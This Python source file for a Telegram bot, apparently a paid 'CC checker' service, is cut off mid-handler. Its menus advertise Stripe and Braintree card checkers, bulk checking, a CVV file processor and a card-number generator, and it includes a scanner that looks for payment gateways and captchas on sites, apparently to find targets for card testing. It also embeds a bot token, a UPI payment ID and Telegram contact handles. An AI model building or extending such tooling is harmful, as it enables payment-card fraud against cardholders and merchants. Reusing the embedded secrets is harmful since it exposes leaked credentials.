import telebot
import replicate
from queue import Queue
import requests
import threading
from threading import Thread, Lock
import json
import os
import time
import datetime
import sqlite3
import re
import logging
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Initialize the bot using the provided token
bot = telebot.TeleBot("7409591129:AAGPj2CjO8E97ZH82OwLBkMLg5OZjPCYH-M")

# Setup logging
logging.basicConfig(filename='bot_errors.log', level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

# Initialize the request queue
request_queue = Queue()  # Ensure this is defined before process_requests

# Database setup
conn = sqlite3.connect('user_data.db', check_same_thread=False)
db_lock = Lock()

def get_cursor():
    return conn.cursor()

def setup_database():
    with db_lock:
        cursor = get_cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                            user_id INTEGER PRIMARY KEY,
                            first_name TEXT,
                            last_name TEXT,
                            rank TEXT DEFAULT 'FREE',
                            credits INTEGER DEFAULT 10,
                            premium_until TEXT
                        )''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS api_keys (
                            id INTEGER PRIMARY KEY,
                            api_key TEXT
                        )''')
        conn.commit()

setup_database()

# Database setup for Bearer token
token_conn = sqlite3.connect('token.db', check_same_thread=False)
token_db_lock = Lock()

def setup_token_database():
    with token_db_lock:
        cursor = token_conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS bearer_tokens (
                            id INTEGER PRIMARY KEY,
                            token TEXT
                        )''')
        token_conn.commit()

setup_token_database()

def set_bearer_token(new_token):
    with token_db_lock:
        cursor = token_conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO bearer_tokens (id, token) VALUES (1, ?)", (new_token,))
        token_conn.commit()

def get_bearer_token():
    with token_db_lock:
        cursor = token_conn.cursor()
        cursor.execute("SELECT token FROM bearer_tokens WHERE id = 1")
        result = cursor.fetchone()
        return result[0] if result else None

# Define the owner ID
OWNER_ID = 7218606355

# Dictionary to temporarily store file paths for users
uploaded_files = {}

# Session management with retry strategy
session = requests.Session()
retry_strategy = Retry(
    total=5,
    backoff_factor=1,
    status_forcelist=[429, 500, 502, 503, 504],
)
adapter = HTTPAdapter(max_retries=retry_strategy)
session.mount("http://", adapter)
session.mount("https://", adapter)

def set_api_key(new_key):
    with db_lock:
        cursor = get_cursor()
        # Log the current API key before updating
        cursor.execute("SELECT api_key FROM api_keys WHERE id = 1")
        current_key = cursor.fetchone()
        logging.info(f"Current API key before update: {current_key}")

        # Update or insert the new API key
        cursor.execute("INSERT OR REPLACE INTO api_keys (id, api_key) VALUES (1, ?)", (new_key,))
        conn.commit()

        # Log the new API key after updating
        cursor.execute("SELECT api_key FROM api_keys WHERE id = 1")
        updated_key = cursor.fetchone()
        logging.info(f"Updated API key: {updated_key}")

def get_api_key():
    with db_lock:
        cursor = get_cursor()
        cursor.execute("SELECT api_key FROM api_keys WHERE id = 1")
        result = cursor.fetchone()
        logging.info(f"Retrieved API key: {result}")
        return result[0] if result else None

# Helper function for long messages
def send_long_message(chat_id, message):
    for i in range(0, len(message), 4096):
        bot.send_message(chat_id, message[i:i + 4096])


# Error handling for uncaught exceptions
def handle_exception(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    logging.error("Uncaught exception", exc_info=(exc_type, exc_value, exc_traceback))


# Set global exception handler
import sys

def handle_exception(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    logging.error("Uncaught exception", exc_info=(exc_type, exc_value, exc_traceback))

sys.excepthook = handle_exception

# Function to execute database queries safely
def execute_query(query, params=()):
    try:
        with db_lock:
            cursor = conn.cursor()
            cursor.execute(query, params)
            conn.commit()
    except Exception as e:
        logging.error(f"Database error: {str(e)}")
        conn.rollback()
    finally:
        cursor.close()

# Function to send messages to Telegram with backoff strategy
def send_with_backoff(method, *args, **kwargs):
    while True:
        try:
            return method(*args, **kwargs)
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 429:
                wait_time = int(e.result_json.get('parameters', {}).get('retry_after', 1))
                logging.warning(f"Rate limit hit. Retrying in {wait_time} seconds.")
                time.sleep(wait_time)
            else:
                logging.error(f"API Telegram Exception: {str(e)}")
                raise


# Function to validate URLs
def is_valid_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://'
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|localhost|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|\[?[A-F0-9]*:[A-F0-9:]+\]?)'
        r'(?::\d+)?(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

# Function to find payment gateways in response
def find_payment_gateways(response_text):
    payment_gateways = [
        "paypal", "stripe", "braintree", "square", "cybersource", "authorize.net", "2checkout",
        "adyen", "worldpay", "sagepay", "checkout.com", "shopify", "razorpay", "bolt", "paytm", 
        "venmo", "pay.google.com", "revolut", "eway", "woocommerce", "upi", "apple.com", "payflow", 
        "payeezy", "paddle", "payoneer", "recurly", "klarna", "paysafe", "webmoney", "payeer", 
        "payu", "skrill", "affirm", "afterpay", "dwolla", "global payments", "moneris", "nmi", 
        "payment cloud", "paysimple", "paytrace", "stax", "alipay", "bluepay", "paymentcloud", 
        "clover", "zelle", "google pay", "cashapp", "wechat pay", "transferwise", "stripe connect", 
        "mollie", "sezzle", "afterpay", "payza", "gocardless", "bitpay", "sureship", 
        "conekta", "fatture in cloud", "payzaar", "securionpay", "paylike", "nexi", 
        "kiosk information systems", "adyen marketpay", "forte", "worldline", "payu latam"
    ]
    
    detected_gateways = []
    for gateway in payment_gateways:
        if gateway in response_text.lower():
            detected_gateways.append(gateway.capitalize())
    return detected_gateways

# Function to check captcha presence
def check_captcha(response_text):
    captcha_keywords = {
        'recaptcha': ['recaptcha', 'google recaptcha'],
        'image selection': ['click images', 'identify objects', 'select all'],
        'text-based': ['enter the characters', 'type the text', 'solve the puzzle'],
        'verification': ['prove you are not a robot', 'human verification', 'bot check'],
        'security check': ['security check', 'challenge'],
        'hcaptcha': [
            'hcaptcha', 'verify you are human', 'select images', 
            'cloudflare challenge', 'anti-bot verification', 'hcaptcha.com',
            'hcaptcha-widget', 'solve the puzzle', 'please verify you are human'
        ]
    }

    detected_captchas = []
    for captcha_type, keywords in captcha_keywords.items():
        for keyword in keywords:
            if re.search(rf'\b{re.escape(keyword)}\b', response_text, re.IGNORECASE):
                if captcha_type not in detected_captchas:
                    detected_captchas.append(captcha_type)

    if re.search(r'<iframe.*?src=".*?hcaptcha.*?".*?>', response_text, re.IGNORECASE):
        if 'hcaptcha' not in detected_captchas:
            detected_captchas.append('hcaptcha')

    return ', '.join(detected_captchas) if detected_captchas else 'No captcha detected'

# Function to check URL and gather information
def check_url(url):
    if not is_valid_url(url):
        return [], 400, "Invalid", "Invalid", "Invalid URL", "N/A", "N/A"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Referer': 'https://www.google.com'
    }

    try:
        response = session.get(url, headers=headers, timeout=10)
        
        if response.status_code == 403:
            for attempt in range(3):
                time.sleep(2 ** attempt)
                response = session.get(url, headers=headers, timeout=10)
                if response.status_code != 403:
                    break

        if response.status_code == 403:
            return [], 403, "403 Forbidden: Access Denied", "N/A", "403 Forbidden", "N/A", "N/A"
        
        response.raise_for_status()
        detected_gateways = find_payment_gateways(response.text)
        captcha_type = check_captcha(response.text)
        gateways_str = ', '.join(detected_gateways) if detected_gateways else "None"

        return detected_gateways, response.status_code, captcha_type, "None", "2D (No extra security)", "N/A", "N/A"

    except requests.exceptions.HTTPError as http_err:
        return [], 500, "HTTP Error", "N/A", f"HTTP Error: {str(http_err)}", "N/A", "N/A"
    except requests.exceptions.RequestException as req_err:
        return [], 500, "Request Error", "N/A", f"Request Error: {str(req_err)}", "N/A", "N/A"

@bot.message_handler(func=lambda message: message.text.startswith(('/start', '.start')))
def handle_start(message):
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name
        last_name = message.from_user.last_name or ''

        execute_query("INSERT OR IGNORE INTO users (user_id, first_name, last_name, rank, credits) VALUES (?, ?, ?, 'FREE', 10)",
                      (user_id, first_name, last_name))

        today_date = datetime.datetime.now().strftime("%d - %m - %Y")

        welcome_message = (
            "-------------\n"
            "𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐦𝐲 𝘼𝙣𝙩𝙞𝙛𝙞𝙚𝙙𝙉𝙪𝙡𝙡 𝘾𝙘 𝘾𝙝𝙚𝙘𝙠𝙚𝙧「 ∅ 」\n"
            "𝐄𝐯𝐞𝐫𝐲 𝐧𝐞𝐰 𝐮𝐬𝐞𝐫 𝐰𝐢𝐥𝐥 𝐠𝐞𝐭 𝟏𝟎 𝐜𝐫𝐞𝐝𝐢𝐭𝐬..\n"
            "𝐏𝐫𝐞𝐬𝐬 /register\n"
            "-------------\n"
            f"📆Today date( {today_date})\n"
            "▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        )

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("👑 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 🔥", url="https://t.me/Null_Realm"))

        bot.reply_to(message, welcome_message, reply_markup=markup)
    except Exception as e:
        logging.error(f"Error handling /start command: {str(e)}")
        bot.reply_to(message, "An error occurred. Please try again later.")

@bot.message_handler(func=lambda message: message.text.startswith(('/register', '.register')))
def handle_register(message):
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name
        last_name = message.from_user.last_name or ''

        execute_query("INSERT OR IGNORE INTO users (user_id, first_name, last_name, rank, credits) VALUES (?, ?, ?, 'FREE', 10)",
                      (user_id, first_name, last_name))

        today_date = datetime.datetime.now().strftime("%d - %m - %Y")

        register_message = (
            f"➤ 𝐔𝐬𝐞𝐫 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝!🎉🎉\n"
            f"➤ 𝐍𝐞𝐰 𝐮𝐬𝐞𝐫 𝐜𝐫𝐞𝐝𝐢𝐭𝐬 : 10\n"
            f"➤ 𝐔𝐬𝐞𝐫 𝐈𝐃 : {user_id}\n"
            "➤ Type /cmds to know my work!!🥰\n"
            "▰▰▰▰▰▰▰▰▰▰▰▰▰"
        )

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("👑 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 🔥", url="https://t.me/Null_Realm"))

        bot.reply_to(message, register_message, reply_markup=markup)
    except Exception as e:
        logging.error(f"Error handling /register command: {str(e)}")
        bot.reply_to(message, "An error occurred. Please try again later.")

@bot.message_handler(func=lambda message: message.text.startswith(('/ping', '.ping')))
def handle_ping(message):
    initial_message = bot.reply_to(message, "Checking Ping...📌")
    
    # Measure the ping
    start_time = time.time()
    time.sleep(0.1)  # Simulate a delay
    end_time = time.time()
    
    # Calculate the ping in milliseconds
    ping = (end_time - start_time) * 1000
    network_speed = 100  # Placeholder value for network speed in Mbps
    
    response = (
        f"✅ Bot Status: Running\n"
        f"📶 Ping: {ping:.2f} ms\n"
        f"⏳ Network Speed: {network_speed} Mbps"
    )
    
    bot.edit_message_text(response, chat_id=initial_message.chat.id, message_id=initial_message.message_id)

# Dictionary to store the last known message content by chat_id and message_id
message_cache = {}

# Main menu message
def send_main_menu(chat_id, message_id):
    main_message = (
        "𝘼𝙣𝙩𝙞𝙛𝙞𝙚𝙙𝙉𝙪𝙡𝙡 𝘾𝙘 𝘾𝙝𝙚𝗰𝗸𝗲𝗿「 ∅ 」:\n\n"
        "🤖 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐜𝐭𝐢𝐯𝐞 ✅\n\n"
        "⚠️ 𝐈𝐟 𝐁𝐎𝐓 𝐃𝐞𝐭𝐞𝐜𝐭 𝐛𝐚𝐝 𝐛𝐞𝐡𝐚𝐯𝐢𝐨𝐫 𝐁𝐎𝐓 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐚𝐮𝐭𝐨 𝐁𝐚𝐧.\n"
        "𝐔 𝐝𝐨𝐧'𝐭 𝐤𝐧𝐨𝐰 𝐜𝐦𝐝 𝐫𝐞𝐚𝐝 𝐜𝐚𝐫𝐞𝐟𝐮𝐥𝐥𝐲 𝐮𝐬𝐞𝐝 𝐜𝐦𝐝𝐬.\n\n"
        "📢 𝐅𝐨𝐫 𝐚𝐧𝐧𝐨𝐮𝐧𝐜𝐞𝐦𝐞𝐧𝐭𝐬 𝐚𝐧𝐝 𝐮𝐩𝐝𝐚𝐭𝐞𝐬, [𝐣𝐨𝐢𝐧 𝐁𝐎𝐓 𝐮𝐩𝐝𝐚𝐭𝐞 𝐜𝐡𝐚𝐧𝐧𝐞𝐥](https://t.me/Null_Realm).\n\n"
        f"📆𝐓𝐨𝐝𝐚𝐲 𝐝𝐚𝐭𝐞({datetime.datetime.now().strftime('%d - %m - %Y')}) 🇯🇵"
    )

    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        InlineKeyboardButton("🛠️ 𝗧𝗼𝗼𝗹𝘀 🛠️", callback_data="tools"),
        InlineKeyboardButton("🔥 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 🤩", callback_data="gateway"),
        InlineKeyboardButton("🌟 𝗕𝗨𝗬 😎", callback_data="buy")
    )

    # Check if the message content has changed
    if message_cache.get((chat_id, message_id)) != main_message:
        try:
            bot.edit_message_text(main_message, chat_id=chat_id, message_id=message_id, reply_markup=markup, parse_mode='Markdown')
            # Update the cache with the new message content
            message_cache[(chat_id, message_id)] = main_message
        except telebot.apihelper.ApiTelegramException as e:
            if "message to edit not found" in str(e) or "message can't be edited" in str(e):
                print("Message not found or can't be edited.")
            else:
                raise

# Tools menu message
def send_tools_menu(chat_id, message_id):
    tools_message = (
        "𝘼𝙣𝙩𝙞𝙛𝙞𝙚𝙙𝙉𝙪𝙡𝙡 𝘾𝙘 𝘾𝙝𝙚𝗰𝗸𝗲𝗿「 ∅ 」:\n\n"
        "✨ TOOLS ✨\n\n"
        "🔹 /bin - Check bin status effortlessly.\n"
        "🔹 /gen - Generate credit card data quickly.\n"
        "🔹 /img - Create an anime image with ease.\n"
        "🔹 /info - See your account status, rank, credits, and premium level.\n"
        "🔹 /url - Single URL analyzer.\n"
        "🔹 /murl - Multi-URL analyzer.\n"
        "🔹 /ping - Bot status checker.\n"
        "🔹 /buy - Premium plans overview.\n"
    )
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(InlineKeyboardButton("𝗛𝗢𝗠𝗘 🏠", callback_data="home"))

    # Check if the message content has changed
    if message_cache.get((chat_id, message_id)) != tools_message:
        try:
            bot.edit_message_text(tools_message, chat_id=chat_id, message_id=message_id, reply_markup=markup)
            # Update the cache with the new message content
            message_cache[(chat_id, message_id)] = tools_message
        except telebot.apihelper.ApiTelegramException as e:
            if "message to edit not found" in str(e):
                print("Message to edit not found.")
            else:
                raise

# Gateway menu message
def send_gateway_menu(chat_id, message_id):
    gateway_message = (
        "𝘼𝙣𝙩𝙞𝙛𝙞𝙚𝙙𝙉𝙪𝙡𝙡 𝘾𝙘 𝘾𝙝𝙚𝗰𝗸𝗲𝗿「 ∅ 」:\n\n"
        "✨ GATEWAY ✨\n\n"
        "🔹 /chk - Stripe card checker.\n"
        "🔹 /mchk - Bulk card checker (Premium only).\n"
        "🔹 /cvvtxt - CVV file processor.\n"
        "🔹 /b3 - Braintree card checker.\n"
        "🔹 /buy - Premium plans overview.\n"
    )
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(InlineKeyboardButton("𝗛𝗢𝗠𝗘 🏠", callback_data="home"))

    # Check if the message content has changed
    if message_cache.get((chat_id, message_id)) != gateway_message:
        try:
            bot.edit_message_text(gateway_message, chat_id=chat_id, message_id=message_id, reply_markup=markup)
            # Update the cache with the new message content
            message_cache[(chat_id, message_id)] = gateway_message
        except telebot.apihelper.ApiTelegramException as e:
            if "message to edit not found" in str(e):
                print("Message to edit not found.")
            else:
                raise

# Buy menu message
def send_buy_menu(chat_id, message_id):
    buy_message = (
        "𝘼𝙣𝙩𝙞𝙛𝙞𝙚𝙙𝙉𝙪𝙡𝙡 𝘾𝙘 𝘾𝙝𝙚𝗰𝗸𝗲𝗿「 ∅ 」:\n\n"
        "🔥 𝗜𝗡𝗧𝗥𝗢𝗗𝗨𝗖𝗜𝗡𝗚 𝗔𝗡𝗧𝗜𝗙𝗜𝗘𝗗𝗡𝗨𝗟𝗟 𝗖𝗖 𝗖𝗛𝗘𝗖𝗞𝗘𝗥! 🔥\n"
        "━━━━━━━━━━━━━━━\n\n"
        "⚡ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗣𝗟𝗔𝗡𝗦 ⚡\n"
        "💰 𝟭 𝗗𝗔𝗬: ₹10 = 500 Credits\n"
        "💰 𝟳 𝗗𝗔𝗬𝗦: ₹50 = 9,999 Credits\n"
        "💰 𝟯𝟬 𝗗𝗔𝗬𝗦: ₹100 = 99,999 Credits\n\n"
        "🎯 𝗪𝗛𝗬 𝗖𝗛𝗢𝗢𝗦𝗘 𝗨𝗦?\n"
        "✅ 𝗙𝗔𝗦𝗧, 𝗦𝗘𝗖𝗨𝗥𝗘 & 𝗥𝗘𝗟𝗜𝗔𝗕𝗟𝗘\n"
        "✅ 𝗘𝗫𝗖𝗟𝗨𝗦𝗜𝗩𝗘 𝗦𝗧𝗥𝗜𝗣𝗘 & 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗖𝗛𝗘𝗖𝗞𝗘𝗥𝗦\n"
        "✅ 𝗔𝗙𝗙𝗢𝗥𝗗𝗔𝗕𝗟𝗘 𝗣𝗟𝗔𝗡𝗦\n\n"
        "💳 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗠𝗘𝗧𝗛𝗢𝗗𝗦:\n"
        "📲 𝗨𝗣𝗜: vivekkumarpathak2004@axl\n"
        "💸 𝗖𝗥𝗬𝗣𝗧𝗢: DM for details\n\n"
        "📩 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗨𝗦:\n"
        "👉 @GOD_ANTIFIEDNULL_X | @DEMONS_FATHER | @Bradley_Ruiz9\n"
        "📢 𝗝𝗢𝗜𝗡: @Null_Realm\n"
        "━━━━━━━━━━━━━━━\n\n"
        "𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦:\n"
        "🔹 𝗕𝗜𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 | 𝗖𝗔𝗥𝗗 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 | 𝗠𝗨𝗟𝗧𝗜-𝗨𝗥𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
        "🔹 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗖𝗔𝗥𝗗𝗦 | 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗖𝗩𝗩 𝗙𝗜𝗟𝗘𝗦 | 𝗔𝗡𝗜𝗠𝗘 𝗜𝗠𝗔𝗚𝗘 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥\n"
        "🔹 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗨𝗟𝗧𝗜-𝗖𝗔𝗥𝗗 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n\n"
        "🚀 𝗚𝗘𝗧 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗡𝗢𝗪:\n"
        "Complete payment → Verify → Access!\n\n"
        "🔥 𝗔𝗙𝗙𝗢𝗥𝗗𝗔𝗕𝗟𝗘. 𝗥𝗘𝗟𝗜𝗔𝗕𝗟𝗘. 𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟. 🔥"
    )
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(InlineKeyboardButton("𝗛𝗢𝗠𝗘 🏠", callback_data="home"))

    # Check if the message content has changed
    if message_cache.get((chat_id, message_id)) != buy_message:
        try:
            bot.edit_message_text(buy_message, chat_id=chat_id, message_id=message_id, reply_markup=markup)
            # Update the cache with the new message content
            message_cache[(chat_id, message_id)] = buy_message
        except telebot.apihelper.ApiTelegramException as e:
            if "message to edit not found" in str(e):
                print("Message to edit not found.")
            else:
                raise

# Handle /cmds command
@bot.message_handler(func=lambda message: message.text.startswith(('/cmds', '.cmds')))
def handle_cmds(message):
    chat_id = message.chat.id
    message_id = message.message_id
    bot.send_message(chat_id, "Loading menu...", reply_markup=None)  # Send an initial message
    send_main_menu(chat_id, message_id + 1)  # Edit the message to show the menu

# Callback handler for inline buttons
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "tools":
        send_tools_menu(call.message.chat.id, call.message.message_id)
    elif call.data == "gateway":
        send_gateway_menu(call.message.chat.id, call.message.message_id)
    elif call.data == "buy":
        send_buy_menu(call.message.chat.id, call.message.message_id)
    elif call.data == "home":
        send_main_menu(call.message.chat.id, call.message.message_id)


@bot.message_handler(func=lambda message: message.text.startswith(('/buy', '.buy')))
def handle_buy_plan(message):
    response = (
        "🔥 𝗜𝗡𝗧𝗥𝗢𝗗𝗨𝗖𝗜𝗡𝗚 𝗔𝗡𝗧𝗜𝗙𝗜𝗘𝗗𝗡𝗨𝗟𝗟 𝗖𝗖 𝗖𝗛𝗘𝗖𝗞𝗘𝗥! 🔥\n"
        "━━━━━━━━━━━━━━━\n\n"
        "⚡ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗣𝗟𝗔𝗡𝗦 ⚡\n"
        "💰 𝟭 𝗗𝗔𝗬: ₹10 = 500 Credits\n"
        "💰 𝟳 𝗗𝗔𝗬𝗦: ₹50 = 9,999 Credits\n"
        "💰 𝟯𝟬 𝗗𝗔𝗬𝗦: ₹100 = 99,999 Credits\n\n"
        "🎯 𝗪𝗛𝗬 𝗖𝗛𝗢𝗢𝗦𝗘 𝗨𝗦?\n"
        "✅ 𝗙𝗔𝗦𝗧, 𝗦𝗘𝗖𝗨𝗥𝗘 & 𝗥𝗘𝗟𝗜𝗔𝗕𝗟𝗘\n"
        "✅ 𝗘𝗫𝗖𝗟𝗨𝗦𝗜𝗩𝗘 𝗦𝗧𝗥𝗜𝗣𝗘 & 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗖𝗛𝗘𝗖𝗞𝗘𝗥𝗦\n"
        "✅ 𝗔𝗙𝗙𝗢𝗥𝗗𝗔𝗕𝗟𝗘 𝗣𝗟𝗔𝗡𝗦\n\n"
        "💳 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗠𝗘𝗧𝗛𝗢𝗗𝗦:\n"
        "📲 𝗨𝗣𝗜: vivekkumarpathak2004@axl\n"
        "💸 𝗖𝗥𝗬𝗣𝗧𝗢: DM for details\n\n"
        "📩 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗨𝗦:\n"
        "👉 @GOD_ANTIFIEDNULL_X | @DEMONS_FATHER | @Bradley_Ruiz9\n"
        "📢 𝗝𝗢𝗜𝗡: @Null_Realm\n\n"
        "━━━━━━━━━━━━━━━\n\n"
        "𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦:\n"
        "🔹 𝗕𝗜𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 | 𝗖𝗔𝗥𝗗 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 | 𝗠𝗨𝗟𝗧𝗜-𝗨𝗥𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
        "🔹 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗖𝗔𝗥𝗗𝗦 | 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗖𝗩𝗩 𝗙𝗜𝗟𝗘𝗦 | 𝗔𝗡𝗜𝗠𝗘 𝗜𝗠𝗔𝗚𝗘 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥\n"
        "🔹 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗨𝗟𝗧𝗜-𝗖𝗔𝗥𝗗 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n\n"
        "🚀 𝗚𝗘𝗧 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗡𝗢𝗪:\n"
        "Complete payment → Verify → Access!\n\n"
        "🔥 𝗔𝗙𝗙𝗢𝗥𝗗𝗔𝗕𝗟𝗘. 𝗥𝗘𝗟𝗜𝗔𝗕𝗟𝗘. 𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟. 🔥"
    )
    bot.reply_to(message, response)

def is_authorized(user_id):
    return user_id == OWNER_ID or is_admin(user_id)

def is_admin(user_id):
    cursor = get_cursor()
    cursor.execute("SELECT rank FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()
    return user and user[0] == 'ADMIN'

def determine_rank(rank, premium_until):
    if premium_until and time.strptime(premium_until, '%Y-%m-%d') > time.localtime():
        return rank if rank != 'FREE' else 'PREMIUM'
    return rank

cancel_process = False

# Enhanced /watch command with Cancel button
@bot.message_handler(func=lambda message: message.text.startswith(('/watch', '.watch')))
def handle_watch(message):
    global cancel_process
    cancel_process = False  # Reset cancel flag for new process

    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "Authorization required to execute this command.")
        return

    cursor = get_cursor()
    cursor.execute("SELECT user_id, first_name, last_name, rank, credits, premium_until FROM users")
    users = cursor.fetchall()

    if not users:
        bot.reply_to(message, "No users found.")
        return

    batch_size = 3
    keyboard = InlineKeyboardMarkup()
    cancel_button = InlineKeyboardButton("Cancel ✖️", callback_data="cancel")
    keyboard.add(cancel_button)

    for i in range(0, len(users), batch_size):
        if cancel_process:
            bot.send_message(message.chat.id, "Process cancelled.")
            return

        batch = users[i:i + batch_size]
        message_text = "👥 User Details:\n"
        for user in batch:
            user_id, first_name, last_name, rank, credits, premium_until = user
            actual_rank = determine_rank(rank, premium_until)
            message_text += (
                f"User ID: {user_id}\n"
                f"Name: {first_name} {last_name}\n"
                f"Rank: {actual_rank}\n"
                f"Credits: {credits}\n"
                f"Premium Until: {premium_until or 'N/A'}\n"
                "--------------------------------------\n"
            )

        # Send or edit the message with each batch
        if i == 0:
            msg = bot.send_message(message.chat.id, message_text, reply_markup=keyboard)
        else:
            bot.edit_message_text(message_text, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)

        time.sleep(15)  # Wait 15 seconds before processing the next batch

    # Final message update
    if not cancel_process:
        bot.edit_message_text("End of Batch", chat_id=msg.chat.id, message_id=msg.message_id)
        time.sleep(5)  # Wait a few seconds before deletion
        bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)

# Callback query handler for cancel button
@bot.callback_query_handler(func=lambda call: call.data == "cancel")
def handle_cancel(call):
    global cancel_process
    cancel_process = True
    bot.edit_message_text("Process cancelled.", chat_id=call.message.chat.id, message_id=call.message.message_id)

# Enhanced /info command
@bot.message_handler(func=lambda message: message.text.startswith(('/info', '.info')))
def handle_info(message):
    user_id = message.from_user.id
    cursor = get_cursor()
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()

    if user:
        rank = determine_rank(user[3], user[5])
        response = (
            f"🎖️ Account Details 🎖️\n"
            f"First Name: {user[1]}\n"
            f"Last Name: {user[2]}\n"
            f"User ID: {user[0]}\n"
            f"Rank: {rank}\n"
            f"Credits: {user[4]}\n"
            f"Premium Until: {user[5] or 'N/A'}"
        )
    else:
        response = "User not found in our database. Please use /register."

    bot.reply_to(message, response)

# Handle /setrank command
@bot.message_handler(func=lambda message: message.text.startswith(('/setrank', '.setrank')))
def handle_setrank(message):
    try:
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "Authorization required to execute this command.")
            return

        parts = message.text.split(maxsplit=2)  # Correct parsing of rank and user_id
        if len(parts) < 3:
            bot.reply_to(message, "Please provide a new rank and a user ID (e.g., /setrank NEW_RANK user_id).")
            return

        new_rank = parts[1]  # Rank is the second argument
        user_id = int(parts[2])  # User ID is the third argument

        cursor = get_cursor()
        cursor.execute("UPDATE users SET rank=? WHERE user_id=?", (new_rank, user_id))
        conn.commit()
        bot.reply_to(message, f"User {user_id} rank updated to {new_rank}.")
    except ValueError:
        bot.reply_to(message, "Invalid input. Please ensure the user ID is a number.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")
        
# Handle /rem command
@bot.message_handler(func=lambda message: message.text.startswith(('/rem', '.rem')))
def handle_remove_premium(message):
    try:
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "Authorization required to execute this command.")
            return

        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Please provide a user ID to remove premium status.")
            return

        user_id = int(parts[1])
        cursor = get_cursor()
        cursor.execute("UPDATE users SET rank='FREE', premium_until=NULL WHERE user_id=?", (user_id,))
        conn.commit()
        bot.reply_to(message, f"Premium status removed from user {user_id}.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")
        


# Handle /clear command
@bot.message_handler(func=lambda message: message.text.startswith(('/clear', '.clear')))
def handle_clear_credits(message):
    try:
        if not is_authorized(message.from_user.id):
            bot.reply_to(message, "Authorization required to execute this command.")
            return

        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Please provide a user ID to clear credits.")
            return

